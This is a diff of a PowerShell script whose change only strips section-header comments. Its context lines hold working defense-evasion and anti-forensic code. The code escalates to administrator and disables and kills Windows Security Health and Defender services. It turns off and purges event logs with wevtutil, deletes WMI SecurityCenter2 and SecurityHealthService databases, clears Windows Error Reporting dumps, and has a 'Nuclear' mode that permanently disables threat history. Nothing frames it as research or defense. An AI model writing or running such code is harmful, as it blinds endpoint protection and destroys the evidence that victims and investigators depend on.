@@ -1,7 +1,4 @@
 
-# ------------------------------------------------------------
-# 0. SHADOW BOOTSTRAP
-# ------------------------------------------------------------
 param([switch]$ForceAdmin, [switch]$ShadowMode, [switch]$Nuclear)
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -14,9 +11,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 
 if ($ShadowMode) { $ErrorActionPreference = 'SilentlyContinue' }
 
-# ------------------------------------------------------------
-# 1. KILL SECURITY HEALTH SERVICE & DEPENDENCIES
-# ------------------------------------------------------------
 Write-Host "[1] Terminating Security Health ecosystem..." -ForegroundColor Cyan
 
 $securityServices = @(
@@ -36,9 +30,7 @@ foreach ($service in $securityServices) {
     sc.exe config $service start= disabled >$null 2>&1
 }
 
-# ------------------------------------------------------------
-# 2. DESTROY EVENT LOGS + BACKUPS (COMPLETE)
-# ------------------------------------------------------------
+
 Write-Host "[2] Annihilating Event Log artifacts..." -ForegroundColor Cyan
 
 $defenderLogs = @(
@@ -72,9 +64,7 @@ foreach ($log in $defenderLogs) {
     wevtutil.exe sl $log /e:false /rt:false /ms:0 2>$null
 }
 
-# ------------------------------------------------------------
-# 3. NUKE WMI PERMANENT STORAGE (ROOT\SECURITYCENTER2)
-# ------------------------------------------------------------
+
 Write-Host "[3] Purging WMI permanent threat database..." -ForegroundColor Cyan
 
 # Delete all AntiVirusProduct instances (where Defender stores history)
@@ -99,9 +89,6 @@ if (Test-Path $cimRepo) {
     Start-Service -Name "winmgmt" -ErrorAction SilentlyContinue
 }
 
-# ------------------------------------------------------------
-# 4. SECURITYHEALTHSERVICE DATABASE DESTRUCTION
-# ------------------------------------------------------------
 Write-Host "[4] Destroying SecurityHealthService database..." -ForegroundColor Cyan
 
 $securityHealthPaths = @(
@@ -139,9 +126,6 @@ foreach ($path in $securityHealthPaths) {
     }
 }
 
-# ------------------------------------------------------------
-# 5. WINDOWS SECURITY APP CACHE ANNIHILATION
-# ------------------------------------------------------------
 Write-Host "[5] Obliterating Windows Security App cache..." -ForegroundColor Cyan
 
 # Kill SecurityHealthSystray and App processes
@@ -169,9 +153,6 @@ if (Test-Path $actionCenterPath) {
     Remove-ItemProperty -Path $actionCenterPath -Name "*" -ErrorAction SilentlyContinue
 }
 
-# ------------------------------------------------------------
-# 6. WINDOWS ERROR REPORTING (WER) THREAT DUMPS
-# ------------------------------------------------------------
 Write-Host "[6] Purging Windows Error Reporting threat dumps..." -ForegroundColor Cyan
 
 $werPaths = @(
@@ -199,9 +180,6 @@ if (Test-Path $werReg) {
     Remove-ItemProperty -Path "$werReg\QueuedReports" -Name "*" -ErrorAction SilentlyContinue
 }
 
-# ------------------------------------------------------------
-# 7. DEFENDER TELEMETRY & DIAGNOSTICS DESTRUCTION
-# ------------------------------------------------------------
 Write-Host "[7] Destroying Defender telemetry pipeline..." -ForegroundColor Cyan
 
 # Stop and disable Diagnostics Tracking Service
@@ -226,9 +204,6 @@ $telemetryKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection"
 if (-not (Test-Path $telemetryKey)) { New-Item -Path $telemetryKey -Force | Out-Null }
 Set-ItemProperty -Path $telemetryKey -Name "AllowTelemetry" -Value 0 -Type DWord -Force
 
-# ------------------------------------------------------------
-# 8. NUCLEAR OPTION: DISABLE THREAT HISTORY COMPLETELY
-# ------------------------------------------------------------
 if ($Nuclear) {
     Write-Host "[8] Activating NUCLEAR OPTION: Permanent threat history disable..." -ForegroundColor Red
     
@@ -252,9 +227,6 @@ if ($Nuclear) {
     }
 }
 
-# ------------------------------------------------------------
-# 9. RESTART SERVICES WITH CLEAN STATE
-# ------------------------------------------------------------
 Write-Host "[9] Restarting services with clean state..." -ForegroundColor Cyan
 
 # Re-enable services but with clean configuration
@@ -272,9 +244,7 @@ if ($secHealth) {
     Start-Service -Name "SecurityHealthService" -ErrorAction SilentlyContinue
 }
 
-# ------------------------------------------------------------
-# 10. FINAL VERIFICATION & CLEANUP
-# ------------------------------------------------------------
+
 Write-Host "[10] Verification and final cleanup..." -ForegroundColor Cyan
 
 # Check if threat history still exists
